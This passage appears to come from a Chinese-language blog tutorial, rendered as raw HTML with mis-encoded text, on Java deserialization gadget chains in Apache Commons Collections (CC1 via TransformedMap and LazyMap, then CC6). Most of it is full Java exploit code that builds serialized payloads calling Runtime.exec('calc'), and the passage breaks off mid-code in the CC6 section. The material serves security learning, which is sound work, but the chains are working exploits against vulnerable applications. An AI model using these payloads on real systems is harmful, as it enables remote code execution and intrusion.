class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Constructor constructor=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        </span><br><span class="line">        Serializ(o);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯è¿™ä¸ªexpè¿˜æ˜¯æœ‰ç‚¹é—®é¢˜æˆ‘ä»¬å¯ä»¥ä¸‹ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹<br><img src="/2024/09/25/CC%E9%93%BE/CC1_16.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æœ€åé€šè¿‡get(name)æ¥å¾—åˆ°typeå³æˆ‘ä»¬ä¼ å…¥çš„æ³¨è§£ç±»ä¸­çš„å±æ€§ã€‚<br>è€Œnameçš„å€¼å°±æ˜¯æˆ‘ä»¬çš„mapçš„keyï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨map.putä¼ å…¥keyä¸ºæ³¨è§£ç±»çš„å±æ€§åå³å¯<br><img src="/2024/09/25/CC%E9%93%BE/CC1_17.png" class="" title="alt text"><br>æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªmapçš„keyä¸ºvalue<br>å³å¯å‘½ä»¤æ‰§è¡Œï¼Œexpå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Constructor constructor=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        </span><br><span class="line">        Serializ(o);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="CC1-LazyMap"><a href="#CC1-LazyMap" class="headerlink" title="CC1_LazyMap"></a>CC1_LazyMap</h1><p>ysoserialä¸­å…¶CC1çš„è°ƒç”¨é“¾å¹¶æ²¡ç”¨ç”¨åˆ°TransformerMapè€Œæ˜¯ä½¿ç”¨äº†LazyMapï¼Œä½¿ç”¨è¿™ä¸ªç±»æ¥æ„é€ å…¶å®éš¾åº¦ä¼šæ¯”TransformerMapæ¥çš„å¤§ï¼Œå› ä¸ºå…¶éœ€è¦ç”¨çš„ä¸€ä¸ªjavaçš„æ¦‚å¿µï¼Œå³åŠ¨æ€ä»£ç†ã€‚<br>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹LazyMapæ˜¯å¦‚ä½•è°ƒç”¨transformçš„<br><img src="/2024/09/25/CC%E9%93%BE/lazy1.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶æ˜¯åœ¨getä¸‹è°ƒç”¨äº†transformï¼Œä½†æ˜¯è¿™ä¸ªgetæ–¹æ³•æˆ‘ä»¬åœ¨AnnotationInvocationHandlerä¸‹çš„readObjectæ˜¯æ‰¾ä¸åˆ°è°ƒç”¨çš„ï¼Œåè€Œåœ¨invokeä¸­æ‰¾åˆ°äº†è¿™ä¸ªè°ƒç”¨ã€‚<br><img src="/2024/09/25/CC%E9%93%BE/lazy2.png" class="" title="alt text"><br>å¹¶ä¸”æˆ‘ä»¬å¯ä»¥å‘ç°AnnotationInvocationHandlerè¿™ä¸ªç±»æ˜¯ä¸€ä¸ªå®Œæˆäº†InvocationHandleræ¥å£çš„ç±»ã€‚é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªMapçš„åŠ¨æ€ä»£ç†ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºAnnotationInvocationHandlerï¼Œé‚£ä¹ˆè¿™ä¸ªä»£ç†åœ¨è°ƒç”¨ä»»æ„æ–¹æ³•æ—¶éƒ½ä¼šè·³åˆ°invokeä¸­ã€‚è¿›è€Œæ‰§è¡Œinvokeä¸­çš„memberValues.get(member);æ¥å‘½ä»¤æ‰§è¡Œ<br>å…¶é“¾å­çš„ååŠæ®µæ— æ”¹å˜<br>æˆ‘ä»¬å†™ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„demo<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       (<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">       Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">       Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       Map lazyMap= LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">       Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">       Constructor constructor=clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">       constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Target.class,lazyMap);</span><br><span class="line">       Map proxyMap= (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">       proxyMap.entrySet();</span><br></pre></td></tr></table></figure><br>å…¶å®ä¸Šé¢çš„demoä¸­çš„proxyä»£ç†ä»»æ„æ¥å£éƒ½å¯ä»¥å¼¹å‡ºè®¡ç®—æœºï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬çš„ååºåˆ—åŒ–å…¥å£ç‚¹æ˜¯AnnotationInvocationHandlerçš„readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å°†proxyä¼ å…¥AnnotationInvocationHandlerï¼Œè€Œå…¶readObjectä¸‹è°ƒçš„æ˜¯entrySet()å¦‚ä¸‹<br><img src="/2024/09/25/CC%E9%93%BE/lazy3.png" class="" title="alt text"><br>å³æˆ‘ä»¬ä¼ å…¥çš„proxyè¦å¯ä»¥è°ƒç”¨entrySet()è¿™æ ·æ‰å¯ä»¥æ­£å¸¸è¿›å…¥invokeï¼Œè€Œè¿™ä¸ªæ–¹æ³•æ˜¯åœ¨Mapé‡Œå®šä¹‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ¥å£è¦å®šä¹‰ä¸ºMap<br>expå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Target.class,lazyMap);</span><br><span class="line">        Map proxyMap= (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">        InvocationHandler inv=(InvocationHandler)constructor.newInstance(Target.class,proxyMap);</span><br><span class="line">        Serializ(inv);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>å­¦ä¹ è¿™è·³é“¾å­çš„ç›®çš„æ˜¯å› ä¸ºæˆ‘ä»¬å­¦ä¹ çš„CC1åœ¨é«˜ç‰ˆæœ¬çš„JDK8u71ä»¥åå°±æ— æ³•ä½¿ç”¨è¿™æ˜¯å› ä¸ºï¼Œåœ¨jdk8u71åå¯¹AnnotationInvocationHandlerçš„readObjectè¿›è¡Œäº†æ›´æ”¹ã€‚å¦‚ä¸‹<br><img src="/2024/09/25/CC%E9%93%BE/CC6_1.png" class="" title="alt text"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°CC1çš„ä¸¤ç»™åˆ†æ”¯TransformerMapå’ŒLazyMapä½äºreadObjectçš„è§¦å‘ç‚¹éƒ½ä¿®å¤äº†å¯¼è‡´æˆ‘ä»¬æ— æ³•å¯¹å…¶è¿›è¡Œåˆ©ç”¨</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å­¦ä¹ è¿™æ¡CC6<br>CC6è¿™æ¡é“¾å­çš„ååŠæ®µå…¶å®å’ŒCC1_LazyMapé‚£æ¡æ˜¯æ²¡ä»€ä¹ˆå·®åˆ«çš„ï¼Œå› ä¸ºjavaé«˜ç‰ˆæœ¬ä¿®æ”¹äº†AnnotationInvocationHandleræ‰€ä»¥æˆ‘ä»¬åªèƒ½åœ¨å…¶ä»–ç±»é‡Œå¯»æ‰¾è°ƒç”¨äº†getçš„æ–¹æ³•ã€‚</p><p>æœ€åæˆ‘ä»¬å¯ä»¥åœ¨TiedMapEntryé‡Œæ‰¾åˆ°ä¸€ä¸ªgetValueè°ƒç”¨äº†map.get()<br><img src="/2024/09/25/CC%E9%93%BE/CC6_2.png" class="" title="alt text"><br>ç»§ç»­æ‰¾å¯ä»¥åœ¨åŒç±»ä¸‹çš„hashCode()ä¸‹å‘ç°è°ƒç”¨äº†getValue()ã€‚<br><img src="/2024/09/25/CC%E9%93%BE/CC6_3.png" class="" title="alt text"><br>çœ‹åˆ°è¿™ä¸ªhashCodeï¼Œæ­»å»çš„å›å¿†ä¸€ä¸‹å­å¼€å§‹æ”»å‡»æˆ‘äº†ã€‚æˆ‘ä»¬åœ¨ä¹‹å‰å­¦ä¹ çš„URLDNSå°±æœ‰åˆ©ç”¨åˆ°hashCode(),é‚£ä¹ˆå‰©ä¸‹çš„è°ƒç”¨é“¾ä¸æ˜¯å’ŒURLDNSä¸€æ ·å˜›ã€‚</p><p>é€šè¿‡HashMapçš„readObjectå¯ä»¥è°ƒç”¨åˆ°hash()ï¼Œhash()æ–¹æ³•ä¸‹è°ƒç”¨äº†hashCodeã€‚</p><p>å°±è¿™æ ·æˆ‘ä»¬å¯ä»¥å†™å‡ºå¦‚ä¸‹exp<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span 